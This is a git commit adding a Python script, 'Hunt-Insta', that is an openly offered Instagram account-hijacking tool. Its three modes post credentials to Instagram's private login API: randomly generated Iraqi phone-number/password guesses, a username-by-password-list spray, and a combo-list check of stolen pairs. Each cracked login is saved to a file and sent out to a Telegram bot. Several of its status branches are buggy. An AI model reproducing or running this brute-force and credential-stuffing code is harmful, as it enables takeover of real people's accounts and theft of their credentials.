ed3a5da47314ca6ceb84e7a1848a9a25c39e2dad
MrGps1 <87803991+MrGps1@users.noreply.github.com>
2021-07-31 16:30:48 +0300

    Add files via upload

---
+++ Hunt-Insta.py
@@ -0,0 +1,598 @@
+import os
+
+import sys
+
+import requests
+
+import time
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+green = ("\033[1;32m")
+red = ("\033[1;31m")
+cyan = ("\033[1;36m")
+purple = ("\033[1;35m")
+yelow = ("\033[1;33m")
+white = ("\033[1;97m")
+
+
+time.sleep(0.2)
+print(red+"               ¶ ¶¶                           ¶¶ ¶                ")
+time.sleep(0.2)
+print("              ¶¶ ¶¶                           ¶¶ ¶¶               ")
+time.sleep(0.2)
+print("             ¶¶  ¶¶                           ¶¶  ¶¶             ")
+time.sleep(0.2)
+print("             ¶¶  ¶¶                           ¶¶  ¶¶             ")
+time.sleep(0.2)
+print("              ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶               ")
+time.sleep(0.2)
+print("               ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶                ")
+time.sleep(0.2)
+print("                ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶                 ")
+time.sleep(0.2)
+print("       ¶¶¶       ¶¶  ¶¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶        ")
+time.sleep(0.2)
+print("      ¶¶¶¶¶     ¶¶   ¶¶¶¶¶¶¶   ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶       ")
+time.sleep(0.2)
+print("     ¶¶   ¶¶    ¶¶     ¶¶¶    ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶      ")
+time.sleep(0.2)
+print("    ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶  ¶¶¶¶    ¶¶¶    ")
+time.sleep(0.2)
+print("   ¶¶         ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶         ¶¶   ")
+time.sleep(0.2)
+print("   ¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶¶   ")
+time.sleep(0.2)
+print("     ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶             ¶¶¶¶¶      ¶¶¶¶ ¶¶¶¶¶      ")
+time.sleep(0.2)
+print("             ¶¶¶¶¶¶  ¶¶¶  ¶¶          ¶¶  ¶¶¶  ¶¶¶¶¶¶             ")
+time.sleep(0.2)
+print("                 ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶                    ")
+time.sleep(0.2)
+print("                    ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶                    ")
+time.sleep(0.2)
+print("                  ¶¶¶¶  ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶  ¶¶¶¶                    ")
+time.sleep(0.2)
+print("               ¶¶¶¶¶ ¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶ ¶¶¶¶¶                ")
+	
+os.system('clear')
+
+
+
+
+
+import os
+from time import sleep
+os.system("title " + " #ahmedhani12")
+clear = lambda : os.system('cls')
+
+try:
+    import requests
+except ImportError:
+    os.system('pip install requests')
+    import requests
+    clear()
+try:
+    from colored import fg
+except ImportError:
+    os.system('pip install colored')
+    from colored import fg
+    clear()
+try:
+    from uuid import uuid4
+except ImportError:
+    os.system('pip install uuid')
+    from uuid import uuid4
+    clear()
+try:
+    import random
+except ImportError:
+    os.system('pip install random')
+    import random
+    clear()
+color3 = fg(2)
+color4 = fg('9')    
+
+def close():
+    input('- Press Enter To Exit /')
+    sys.exit()
+
+clear()
+os.system('color a')
+def banner():
+	print("")
+os.system("clear")
+time.sleep(0.5)
+print(white+"< ━━━━━━━━━━━━━ [★] GitHub : MrGps1 [★] ━━━━━━━━━━━━━ >")
+print("")
+
+time.sleep(0.5)
+print(cyan+"""       __  ___     ______""")
+time.sleep(0.5)
+print(green+"""      /  |/  /____/ ____/___  _____""")
+time.sleep(0.5)
+print(red+"""     / /|_/ / ___/ / __/ __ \/ ___/""")
+time.sleep(0.5)
+print(purple+"""    / /  / / /  / /_/ / /_/ (__  )""")
+time.sleep(0.5)
+print(yelow+"""   /_/  /_/_/   \____/ .___/____/""")
+time.sleep(0.5)
+print(white+"""                    /_/""")
+
+print("")
+time.sleep(0.5)
+print(purple+"< ━━━━━━━━━━━━━ [★] GitHub : MrGps1 [★] ━━━━━━━━━━━━━ >")
+
+print("")
+print(green+"  Coder")
+time.sleep(0.7)
+print("")
+print(cyan+"  Instagram : mr.gps1")
+time.sleep(0.7)
+print("")
+print(green+"  Telegram : MrGps1")
+time.sleep(0.7)
+print("")
+print(cyan+"  GitHub : MrGps1")
+time.sleep(0.7)
+print("")
+
+MrGps1 = requests.get("https://pastebin.com/raw/QEhFmCGm")
+print("")
+password = input(red+'  TOOL PASSWORD: ')
+if password == "" :
+  sys.exit()
+if password in str(MrGps1.text):
+  print("")
+  print(green+"  FIRST STEP Is Done. Logged in Successfully as ")
+  time.sleep(2)
+  os.system("clear")
+else:
+  print ("  Wrong Password !")
+  sys.exit()
+  os.system("clear")
+
+time.sleep(0.5)
+print(white+"< ━━━━━━━━━━━━━ [★] GitHub : MrGps1 [★] ━━━━━━━━━━━━━ >")
+print("")
+
+time.sleep(0.5)
+print(cyan+"""       __  ___     ______""")
+time.sleep(0.5)
+print(green+"""      /  |/  /____/ ____/___  _____""")
+time.sleep(0.5)
+print(red+"""     / /|_/ / ___/ / __/ __ \/ ___/""")
+time.sleep(0.5)
+print(purple+"""    / /  / / /  / /_/ / /_/ (__  )""")
+time.sleep(0.5)
+print(yelow+"""   /_/  /_/_/   \____/ .___/____/""")
+time.sleep(0.5)
+print(white+"""                    /_/""")
+
+print("")
+time.sleep(0.5)
+print(purple+"< ━━━━━━━━━━━━━ [★] GitHub : MrGps1 [★] ━━━━━━━━━━━━━ >")
+
+
+banner()
+print("")
+
+h , b,s,block = 0,0,0,0
+tele = ("Y")
+if "Y" in tele:
+    id = input("\033[1;31m  [|+|]"+cyan+" Type Your ID : ")
+    print('')
+    bot = input("\033[1;31m  [|+|]"+" \033[1;36mType Your Token : ")
+elif "y" in tele:
+    id = input("\033[1;31m  [|+|]"+cyan+" Type Your ID : ")
+    print('')
+    bot = input("\033[1;31m  [|+|]"+" \033[1;36mType Your Token : ")
+os.system('clear')
+
+print(purple+"< ━━━━━━━━━━━━━ [★] Hunt-Insta [★] ━━━━━━━━━━━━━ >")
+
+print(red,"           __  __            __")
+print(purple,"          / / / /_  ______  / /_")
+time.sleep(0.3)
+print(cyan+"          / /_/ / / / / __ \/ __/                ")
+time.sleep(0.3)
+print(green+"         / __  / /_/ / / / / /")
+time.sleep(0.3)
+print(white+"        /_/ /_/\__,_/_/ /_/\__/")
+time.sleep(0.3)
+print("")
+print(purple+"< ━━━━━━━━━━━━━ [★] Hunt-Insta [★] ━━━━━━━━━━━━━ >")
+
+time.sleep(1)
+print("")
+time.sleep(0.7)
+print(red+"  [1]"+cyan+" Hunter From Combo")
+time.sleep(0.7)
+print(red+"  [2]"+cyan+" Hunter From File")
+time.sleep(0.7)
+print(red+"  [3]"+cyan+" Hunter Random From Tool")
+time.sleep(0.7)
+print(red+"  [0]"+cyan+" Exit")
+time.sleep(0.7)
+print("")
+ask = input(cyan+"  Choose Number : ")
+
+if ask == "3":
+   
+    make = '0123456789'
+    clear()
+    banner()
+    print("")
+    print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+    while True:
+        us = str(''.join((random.choice(make) for i in range(8))))
+        user = '+96477' + us
+        pasw = '077' + us
+        #print(f"\n{user} \n {pasw}")
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello MrGps  New Account\n\___________/\___________/\n[/\] User : {user} \n[\/] Pass : {pasw}\n====================\nCh : @MrGps1. ✪ Ch : @MrGps0")
+            open("Valid Accounts.txt","a").write(f"{user}:{pasw}\n")
+            h += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'challenge_required' or 'two' in log.text:
+            s += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'Bad request' in log.text:
+            b += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        else:
+            b+=1    
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+elif ask =="2":
+    clear()
+    banner()
+    print("")
+    print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+    user = open("Users.txt","r").read().splitlines()  
+    pasw = open("Pass.txt","r").read().splitlines()    
+    for u in user:
+        for p in pasw:    
+            req = requests.session()
+            log_head = {
+            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+            'Accept': "*/*",
+            'Cookie': 'missing',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'en-US',
+            'X-IG-Capabilities': '3brTvw==',
+            'X-IG-Connection-Type': 'WIFI',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Host': 'i.instagram.com'}
+            uid = str(uuid4())
+            log_data = {
+                'uuid': uid,
+                'password': p,
+                'username': u,
+                'device_id': uid,
+                'from_reg': 'false',
+                '_csrftoken': 'missing',
+                'login_attempt_countn': '0'}
+            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+            #print(r.text)
+            if "logged_in_user" in r.text:
+                  if "Y" or "y" in tele:
+                    t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello MrGps  New Account\n\___________/\___________/\n[/\] User : {user} \n[\/] Pass : {pasw}\n\nCh : @MrGps1. ✪ Ch : @MrGps0")
+         
+                    open("Valid Accounts.txt","a").write(f"{u}:{p}\n")
+                    h += 1
+                    print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+            elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+                b += 1
+                print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+            elif 'challenge_required' in log.text:
+                s += 1
+                print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+                open("Scure.txt","w").write(f"{user}:{pasw}\n")
+            elif 'Please wait a few minutes' in log.text:
+                block += 1
+                print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+            elif 'Bad request' in log.text:
+                b += 1
+                print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+            else:
+                b+=1    
+                print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+#==================================================================
+elif ask =="1":
+    assk = input("  [\\] Enter File Name : ")
+    if '.txt' in assk:
+        pass
+    else:
+        assk  = assk + '.txt'
+    clear()
+    banner()
+   
+    print("")
+    print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+    acc = open(assk,"r").read().splitlines()
+    for combo in acc:
+        user = combo.split(":")[0]
+        pasw = combo.split(":")[1]
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello MrGps  New Account\n\___________/\___________/\n[/\] User : {user} \n[\/] Pass : {pasw}\n\nCh : @MrGps1. ✪ Ch : @MrGps0")
+         
+            open("Valid Accounts.txt","a").write(f"{user}:{pasw}\n")
+            h += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'challenge_required' in log.text:
+            s += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        elif 'Bad request' in log.text:
+            b += 1
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+        else:
+            b+=1    
+            print(f"""\r		
+    				
+    				𝗩𝗮𝗹𝗶𝗱 : {h}
+
+					𝗜𝗻𝗩𝗮𝗹𝗶𝗱 : {b}
+					
+					𝗦𝗲𝗰𝘂𝗿𝘁𝘆 : {s}
+					
+					𝗕𝗹𝗼𝗰𝗸𝗲𝗱 : {block}""",end='')
+
+    
